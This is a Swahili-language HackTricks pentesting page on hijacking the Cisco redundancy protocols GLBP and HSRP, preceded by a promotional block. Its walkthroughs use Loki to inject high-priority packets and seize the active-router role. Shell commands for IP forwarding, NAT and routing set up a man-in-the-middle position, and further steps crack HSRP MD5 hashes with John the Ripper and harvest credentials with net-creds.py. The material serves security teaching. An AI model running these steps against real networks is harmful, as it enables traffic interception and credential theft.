# Mashambulizi ya GLBP & HSRP

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Maelezo ya Utekelezaji wa FHRP Hijacking

### Mbinu za FHRP
FHRP imeundwa kutoa nguvu ya mtandao kwa kuunganisha mitambo mingi ya router katika kitengo kimoja cha kubadilishana, hivyo kuboresha usambazaji wa mzigo na uvumilivu wa hitilafu. Cisco Systems iliingiza itifaki maarufu katika mfululizo huu, kama vile GLBP na HSRP.

### Mbinu za Itifaki ya GLBP
Uumbaji wa Cisco, GLBP, hufanya kazi kwenye safu ya TCP/IP, ikichukua UDP kwenye bandari 3222 kwa mawasiliano. Routers katika kikundi cha GLBP hubadilishana pakiti za "hello" kila baada ya sekunde 3. Ikiwa router haitumi pakiti hizi kwa sekunde 10, inadhaniwa kuwa haipo. Walakini, muda huu si wa kudumu na unaweza kurekebishwa.

### Uendeshaji wa GLBP na Usambazaji wa Mzigo
GLBP inajitokeza kwa kuwezesha usambazaji wa mzigo kati ya routers kwa kutumia anwani moja ya IP ya kubadilishana pamoja na anwani nyingi za MAC za kubadilishana. Katika kikundi cha GLBP, kila router inashiriki katika kusonga pakiti. Tofauti na HSRP/VRRP, GLBP hutoa usambazaji wa mzigo wa kweli kupitia njia kadhaa:

- **Usambazaji wa Mzigo Unaotegemea Mwenyeji:** Unahifadhi ugawaji wa anwani ya MAC ya AVF kwa mwenyeji, muhimu kwa mazingira thabiti ya NAT.
- **Usambazaji wa Mzigo wa Round-Robin:** Njia ya msingi, kubadilisha ugawaji wa anwani ya MAC ya AVF kati ya wanaomba mwenyeji.
- **Usambazaji wa Mzigo wa Round-Robin Uliopimwa:** Unagawa mzigo kulingana na vipimo vilivyowekwa vya "Uzito".

### Vipengele na Istilahi muhimu katika GLBP
- **AVG (Lango la Kielelezo cha Kazi):** Router kuu, inayowajibika kwa kugawa anwani za MAC kwa routers wenzake.
- **AVF (Mbeba Mbele wa Kielelezo cha Kazi):** Router iliyoteuliwa kusimamia trafiki ya mtandao.
- **Kipaumbele cha GLBP:** Kipimo kinachodhibiti AVG, kuanzia 100 kwa chaguo-msingi na kati ya 1 na 255.
- **Uzito wa GLBP:** Inaonyesha mzigo wa sasa kwenye router, inayoweza kurekebishwa kwa mikono au kupitia Ufuatiliaji wa Vitu.
- **Anwani ya IP ya Kielelezo cha GLBP:** Inatumika kama lango la kawaida la mtandao kwa vifaa vyote vilivyounganishwa.

Kwa mwingiliano, GLBP hutumia anwani ya multicast iliyohifadhiwa 224.0.0.102 na bandari ya UDP 3222. Routers hutuma pakiti za "hello" kila baada ya sekunde 3, na huchukuliwa kutokuwa na uendeshaji ikiwa pakiti inakosekana kwa kipindi cha sekunde 10.

### Mbinu ya Mashambulizi ya GLBP
Mshambuliaji anaweza kuwa router kuu kwa kutuma pakiti ya GLBP yenye thamani kubwa ya kipaumbele (255). Hii inaweza kusababisha mashambulizi ya DoS au MITM, kuruhusu kudaka au kuelekeza trafiki.

### Kutekeleza Mashambulizi ya GLBP na Loki
[Loki](https://github.com/raizo62/loki_on_kali) inaweza kutekeleza mashambulizi ya GLBP kwa kuingiza pakiti na kipaumbele na uzito uliowekwa kwa 255. Hatua za kabla ya mashambulizi ni pamoja na kukusanya habari kama vile anwani ya IP ya kubadilishana, uwepo wa uwakilishi, na thamani za kipaumbele za router kwa kutumia zana kama Wireshark.

Hatua za Mashambulizi:
1. Badilisha kwa hali ya kusikiliza na wezesha kusonga IP.
2. Tambua router lengwa na upate anwani yake ya IP.
3. Zalisha ARP ya bure.
4. Ingiza pakiti ya GLBP yenye nia mbaya, ukiiga AVG.
5. Tenga anwani ya IP ya pili kwa kiolesura cha mtandao cha mshambuliaji, ikilinganisha na anwani ya IP ya kubadilishana ya GLBP.
6. Tekeleza SNAT kwa uonekano kamili wa trafiki.
7. Badilisha mwelekeo ili kuhakikisha upatikanaji wa mtandao unaendelea kupitia router ya asili ya AVG.

Kwa kufuata hatua hizi, mshambuliaji anajitokeza kama "mtu katikati," mwenye uwezo wa kudaka na kuchambua trafiki ya mtandao, ikiwa ni pamoja na data isiyo na usimbaji au nyeti.

Kwa mfano, hapa kuna vipande vya amri vinavyohitajika:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Kufuatilia na kuingilia kati trafiki inaweza kufanywa kwa kutumia net-creds.py au zana kama hizo kuchukua na kuchambua data inayopita kupitia mtandao uliokumbwa.

### Maelezo ya Kusubiri ya Utekaji wa HSRP na Maelezo ya Amri

#### Maelezo ya Jumla ya Utekaji wa HSRP (Itikadi ya Msimamo wa Haraka wa Router/Itifaki ya Redundancy)
HSRP ni itifaki ya Cisco iliyoundwa kwa ajili ya redundansi ya lango la mtandao. Inaruhusu usanidi wa rutuba za mwili nyingi katika kitengo kimoja la mantiki lenye anwani ya IP iliyoshirikiwa. Kitengo hili la mantiki linasimamiwa na router ya msingi inayowajibika kwa kuelekeza trafiki. Tofauti na GLBP, ambayo hutumia vipimo kama kipaumbele na uzito kwa usawa wa mzigo, HSRP inategemea router moja tu ya aktivi kwa usimamizi wa trafiki.

#### Majukumu na Istilahi katika HSRP
- **Router ya Aktivi ya HSRP**: Kifaa kinachofanya kazi kama lango, kusimamia mtiririko wa trafiki.
- **Router ya Kusubiri ya HSRP**: Router ya akiba, tayari kuchukua nafasi ikiwa router ya aktivi inashindwa.
- **Kikundi cha HSRP**: Seti ya rutuba zinazoshirikiana ili kuunda router ya kubadilika moja.
- **Anwani ya MAC ya HSRP**: Anwani ya MAC ya kubadilika iliyoandaliwa kwa router ya mantiki katika usanidi wa HSRP.
- **Anwani ya IP ya Kibadilika ya HSRP**: Anwani ya IP ya kibadilika ya kikundi cha HSRP, ikifanya kazi kama lango la msingi kwa vifaa vilivyounganishwa.

#### Toleo za HSRP
HSRP inakuja katika toleo mbili, HSRPv1 na HSRPv2, zikitofautiana hasa katika uwezo wa kikundi, matumizi ya IP ya multicast, na muundo wa anwani ya MAC ya kibadilika. Itifaki hutumia anwani maalum za IP za multicast kwa kubadilishana habari ya huduma, na pakiti za Hello hutumwa kila baada ya sekunde 3. Router inachukuliwa kuwa haifanyi kazi ikiwa hakuna pakiti inayopokelewa ndani ya kipindi cha sekunde 10.

#### Mbinu ya Utekaji wa HSRP
Mbinu za HSRP zinahusisha kuchukua jukumu la Router ya Aktivi kwa kuingiza thamani ya kipaumbele ya juu. Hii inaweza kusababisha shambulio la Man-In-The-Middle (MITM). Hatua muhimu kabla ya shambulio ni kukusanya data kuhusu usanidi wa HSRP, ambayo inaweza kufanywa kwa kutumia Wireshark kwa uchambuzi wa trafiki.

#### Hatua za Kupitisha Uthibitishaji wa HSRP
1. Hifadhi trafiki ya mtandao inayojumuisha data ya HSRP kama faili ya .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Chambua hashi za MD5 kutoka kwa faili ya .pcap kwa kutumia hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Gonga hashi za MD5 kwa kutumia John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Kutekeleza Uingizaji wa HSRP na Loki**

1. Anzisha Loki kutambua matangazo ya HSRP.
2. Weka kiolesura cha mtandao kwenye hali ya kusikiliza na wezesha kusonga kwa IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Tumia Loki kulenga router maalum, ingiza nenosiri lililovunjwa la HSRP, na fanya usanidi unaohitajika kujifanya kuwa Router ya Aktivi.
4. Baada ya kupata jukumu la Router ya Aktivi, sanidi kiolesura chako cha mtandao na meza za IP kuingilia trafiki halali.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Badilisha meza ya mwelekeo kuelekeza trafiki kupitia Router ya zamani ya Aktivi.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Tumia net-creds.py au zana kama hiyo kuchukua vibali kutoka kwa trafiki iliyozuiliwa.
```shell
sudo python2 net-creds.py -i eth0
```

Kutekeleza hatua hizi humpa mshambuliaji nafasi ya kuingilia na kudhibiti trafiki, sawa na utaratibu wa utekaji wa GLBP. Hii inaonyesha udhaifu katika itifaki za redundansi kama HSRP na haja ya hatua imara za usalama.
